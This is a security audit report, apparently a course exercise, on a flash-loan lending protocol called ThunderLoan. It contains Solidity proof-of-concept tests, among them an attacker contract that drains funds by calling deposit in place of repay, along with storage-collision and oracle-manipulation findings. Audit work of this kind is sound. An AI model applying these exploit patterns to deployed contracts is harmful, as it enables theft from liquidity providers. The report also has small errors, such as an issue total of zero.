---
title: Protocol Audit Report
author: ALtera21
date: July 14, 2026
header-includes:
  - \usepackage{titling}
  - \usepackage{graphicx}
---

\begin{titlepage}
    \centering
    \begin{figure}[h]
        \centering
        \includegraphics[width=0.5\textwidth]{logo.pdf} 
    \end{figure}
    \vspace*{2cm}
    {\Huge\bfseries Protocol Audit Report\par}
    \vspace{1cm}
    {\Large Version 1.0\par}
    \vspace{2cm}
    {\Large\itshape Cyfrin.io\par}
    \vfill
    {\large \today\par}
\end{titlepage}

\maketitle

<!-- Your report starts here! -->

Prepared by: [Cyfrin](https://cyfrin.io)
Security Researcher: 
ALtera21

# Table of Contents
- [Table of Contents](#table-of-contents)
- [Protocol Summary](#protocol-summary)
- [Disclaimer](#disclaimer)
- [Risk Classification](#risk-classification)
- [Audit Details](#audit-details)
  - [Scope](#scope)
  - [Roles](#roles)
- [Executive Summary](#executive-summary)
  - [Issues found](#issues-found)
- [Findings](#findings)
- [High](#high)
    - [\[H-1\] Erroneous `ThunderLoan::updateExchangeRate` in the `deposit` function causes protocol to think it has more fees than it really does, which blocks redeemption and incorrectly set the exchange rate](#h-1-erroneous-thunderloanupdateexchangerate-in-the-deposit-function-causes-protocol-to-think-it-has-more-fees-than-it-really-does-which-blocks-redeemption-and-incorrectly-set-the-exchange-rate)
    - [\[H-2\] By calling a flashloan and then `ThunderLoan::deposit` instead of `ThunderLoan::repay` users can steal all funds from the protocol](#h-2-by-calling-a-flashloan-and-then-thunderloandeposit-instead-of-thunderloanrepay-users-can-steal-all-funds-from-the-protocol)
    - [\[H-3\] Mixing up variable location causes storage collisions in `ThunderLoan::s_flashLoanFee` and `ThunderLoan::s_currentlyFlashLoaning`, freezing protocol](#h-3-mixing-up-variable-location-causes-storage-collisions-in-thunderloans_flashloanfee-and-thunderloans_currentlyflashloaning-freezing-protocol)
- [Medium](#medium)
    - [\[M-1\] Using TSwap as price oracle leads to price and oracle manipulation attacks](#m-1-using-tswap-as-price-oracle-leads-to-price-and-oracle-manipulation-attacks)

# Protocol Summary

A smart contract application for borrowing money in one transaction

# Disclaimer

The "I do it myself" team makes all effort to find as many vulnerabilities in the code in the given time period, but holds no responsibilities for the findings provided in this document. A security audit by the team is not an endorsement of the underlying business or product. The audit was time-boxed and the review of the code was solely on the security aspects of the Solidity implementation of the contracts.

# Risk Classification

|            |        | Impact |        |     |
| ---------- | ------ | ------ | ------ | --- |
|            |        | High   | Medium | Low |
|            | High   | H      | H/M    | M   |
| Likelihood | Medium | H/M    | M      | M/L |
|            | Low    | M      | M/L    | L   |

We use the [CodeHawks](https://docs.codehawks.com/hawks-auditors/how-to-evaluate-a-finding-severity) severity matrix to determine severity. See the documentation for more details.

# Audit Details 

Commit Hash: 2250d81b89aebdd9cb135382e068af8c269e3a4b

## Scope

```
./src/
#-- interfaces
|   #-- IFlashLoanReceiver.sol
|   #-- IPoolFactory.sol
|   #-- ITSwapPool.sol
|   #-- IThunderLoan.sol
#-- protocol
|   #-- AssetToken.sol
|   #-- OracleUpgradeable.sol
|   #-- ThunderLoan.sol
#-- upgradedProtocol
    #-- ThunderLoanUpgraded.sol
```

## Roles

- Owner: has the power to set tokens that are allowed to be used in the protocol by calling `setAllowedToken`, can change the fee of the protocol by calling `updateFlashLoanFee`, and can upgrade the implementation contract.
- LiqudityProvider: give liquidity to the protocol by calling `deposit` function and receive `AssetToken` tokens as proof of ownership of the liquidity. had the power to withdraw the liqudity in exchange for `AssetToken` tokens by calling `redeem` function
- users/borrower: can borrow their desired token only in a single transaction by calling `flashloan` function and has to call `repay` after or the transaction will revert

# Executive Summary

## Issues found

| Severity | Number of issues found |
| -------- | ---------------------- |
| High     | 3                      |
| Medium   | 1                      |
| Low      | 0                      |
| Info     | 0                      |
| Total    | 0                      |

# Findings

# High

### [H-1] Erroneous `ThunderLoan::updateExchangeRate` in the `deposit` function causes protocol to think it has more fees than it really does, which blocks redeemption and incorrectly set the exchange rate

**Description:** In the ThunderLoan system, the `exchangeRate` is responsible for calculating the exchange rate between assetTokens and underlying tokens. In a way it's responsible for keeping track of how many fees to give to liquitidy providers.

However the `deposit` function, updates this rate, without collecting any fees!

```javascript
    function deposit(IERC20 token, uint256 amount) external revertIfZero(amount) revertIfNotAllowedToken(token) {
        AssetToken assetToken = s_tokenToAssetToken[token];
        uint256 exchangeRate = assetToken.getExchangeRate();
        uint256 mintAmount = (amount * assetToken.EXCHANGE_RATE_PRECISION()) / exchangeRate;
        emit Deposit(msg.sender, token, amount);
        assetToken.mint(msg.sender, mintAmount);
@>      uint256 calculatedFee = getCalculatedFee(token, amount);
@>      assetToken.updateExchangeRate(calculatedFee);
        token.safeTransferFrom(msg.sender, address(assetToken), amount);
    }
```

**Impact:** There are several impacts to this bug.

1. The `redeem` function is blocked, because protocol thinks the owed tokens is more than it has.
2. Rewards are incorrectly calculated, leading to liquidityProviders potentially getting way more or less than deserved.

**Proof of Concept:**

1. LP deposits (exchange rate is updated)
2. User takes out a flash loan
3. t is now impossible for LP to redeem (even without any user takes out a flash loan)
   
<details>
<summary>PoC</summary>

Place the following into `ThunderLoantest.t.sol`

```javascript
    function testRedeemAfterLoan() public setAllowedToken hasDeposits{
        // uint256 amountToBorrow = AMOUNT * 10;
        // uint256 calculatedFee = thunderLoan.getCalculatedFee(tokenA, amountToBorrow);

        // vm.startPrank(user);
        // tokenA.mint(address(mockFlashLoanReceiver), calculatedFee);
        // thunderLoan.flashloan(address(mockFlashLoanReceiver), tokenA, amountToBorrow, "");
        // vm.stopPrank();

        uint256 amountToRedeem = type(uint256).max;
        vm.startPrank(liquidityProvider);
        thunderLoan.redeem(tokenA, amountToRedeem);
    }
```
</details>

**Recommended Mitigation:** Remove the incorrectly updated exchange rate lines from `deposit`

```diff
    function deposit(IERC20 token, uint256 amount) external revertIfZero(amount) revertIfNotAllowedToken(token) {
        AssetToken assetToken = s_tokenToAssetToken[token];
        uint256 exchangeRate = assetToken.getExchangeRate();
        uint256 mintAmount = (amount * assetToken.EXCHANGE_RATE_PRECISION()) / exchangeRate;
        emit Deposit(msg.sender, token, amount);
        assetToken.mint(msg.sender, mintAmount);
-       uint256 calculatedFee = getCalculatedFee(token, amount);
-       assetToken.updateExchangeRate(calculatedFee);
        token.safeTransferFrom(msg.sender, address(assetToken), amount);
    }
```

### [H-2] By calling a flashloan and then `ThunderLoan::deposit` instead of `ThunderLoan::repay` users can steal all funds from the protocol

**Proof of Concept:**

<details>
<summary></summary>

Add the following inside `ThunderLoanTest.t.sol`

```javascript
contract DepositOverRepay is IFlashLoanReceiver{
    ThunderLoan thunderLoan;
    AssetToken assetToken;
    IERC20 s_token;
    
    constructor(address _thunderLoan) {
        thunderLoan = ThunderLoan(_thunderLoan);
    }
    
    function executeOperation(
        address token,
        uint256 amount,
        uint256 fee,
        address /* initiator */,
        bytes calldata /* params */
    )
        external
        returns (bool)
    {
        s_token = IERC20(token);
        assetToken = thunderLoan.getAssetFromToken(IERC20(token));
        IERC20(token).approve(address(thunderLoan), amount + fee);
        thunderLoan.deposit(IERC20(token), amount + fee);
        return true;
    }

    function redeemMoney() public {
        uint256 amount = assetToken.balanceOf(address(this));
        thunderLoan.redeem(s_token, amount);
    }
}
```

add the following inside the test contract

```javascript
    function testUseDepositInsteadOfRepayToStealFunds() public setAllowedToken hasDeposits {
        vm.startPrank(user);
        uint256 amountToBorrow = 50e18;
        uint256 fee = thunderLoan.getCalculatedFee(tokenA, amountToBorrow);
        DepositOverRepay dor = new DepositOverRepay(address(thunderLoan));
        tokenA.mint(address(dor), fee);
        thunderLoan.flashloan(address(dor), tokenA, amountToBorrow, "");
        dor.redeemMoney();
        vm.stopPrank();

        assert(tokenA.balanceOf(address(dor)) > 50e18 + fee);
    }
```
</details>

### [H-3] Mixing up variable location causes storage collisions in `ThunderLoan::s_flashLoanFee` and `ThunderLoan::s_currentlyFlashLoaning`, freezing protocol

**Description:** `ThunderLoan.sol` has two variables in the followin order:

```javascript
    uint256 private s_feePrecision;
    uint256 private s_flashLoanFee; // 0.3% ETH fee
```

However, the upgraded contract `ThunderLoanUpgraded.sol` has them in a different order:

```javascript
    uint256 private s_flashLoanFee; // 0.3% ETH fee
    uint256 public constant FEE_PRECISION = 1e18;
```

Due to how solidity works, after the upgrade the `s_flashLoanfee` will have the value of `s_feePrecision`. You cannot adjust the position of storage variables, and removing storage variables for constant variables, breaks the storage locations as well.

**Impact:** After the upgrade, the `s_flashLoanFee` will have the value of `s_feePrecision`. This means that users who take out flash loans right after an upgrade will be charged the wrong fee.

More importantly, the `s_currentlyFlashLoaning` mapping with storage in the wrong storage slot.

**Proof of Concept:**

1. deploy the contract
2. upgrade the contract

<details>
<summary>PoC</summary>

Place the following into `ThunderLoanTest.t.sol`.

```javascript
import {ThunderLoanUpgraded} from "../../src/upgradedProtocol/ThunderLoanUpgraded.sol";
.
.
.
    function testUpgradeBreaks() public {
        uint256 feeBeforeUpgrade = thunderLoan.getFee();
        vm.startPrank(thunderLoan.owner());
        ThunderLoanUpgraded upgraded = new ThunderLoanUpgraded();
        thunderLoan.upgradeToAndCall(address(upgraded), "");
        uint256 feeAfterUpgrade = thunderLoan.getFee();
        vm.stopPrank();

        console.log("fee before", feeBeforeUpgrade);
        console.log("fee before", feeAfterUpgrade);

        assert(feeBeforeUpgrade != feeAfterUpgrade);
    }
```
</details>

**Recommended Mitigation:** If you must remove the storage variable, leave it as blank as to not mess up the storage slot

```diff
+   uint256 private s_blank;
    uint256 private s_flashLoanFee; // 0.3% ETH fee
    uint256 public constant FEE_PRECISION = 1e18;
```

# Medium

### [M-1] Using TSwap as price oracle leads to price and oracle manipulation attacks

**Description:** The TSwap protocol is a constant product formula based AMM (automated market maker). The price of a token is determined by how many reserves are on either side of the pool. Because of this, it is easy for malicious users to manipulate the price of a token by buying or selling a large amount of the token in the same transaction, essentially ignoring protocol fees. 

**Impact:** Liquidity providers will drastically reduced fees for providing liquidity. 

**Proof of Concept:** 

The following all happens in 1 transaction. 

1. User takes a flash loan from `ThunderLoan` for 1000 `tokenA`. They are charged the original fee `fee1`. During the flash loan, they do the following:
   1. User sells 1000 `tokenA`, tanking the price. 
   2. Instead of repaying right away, the user takes out another flash loan for another 1000 `tokenA`. 
      1. Due to the fact that the way `ThunderLoan` calculates price based on the `TSwapPool` this second flash loan is substantially cheaper. 
```javascript
    function getPriceInWeth(address token) public view returns (uint256) {
        address swapPoolOfToken = IPoolFactory(s_poolFactory).getPool(token);
@>      return ITSwapPool(swapPoolOfToken).getPriceOfOnePoolTokenInWeth();
    }
```
    3. The user then repays the first flash loan, and then repays the second flash loan.

I have created a proof of code located in my `audit-data` folder. It is too large to include here. 

**Recommended Mitigation:** Consider using a different price oracle mechanism, like a Chainlink price feed with a Uniswap TWAP fallback oracle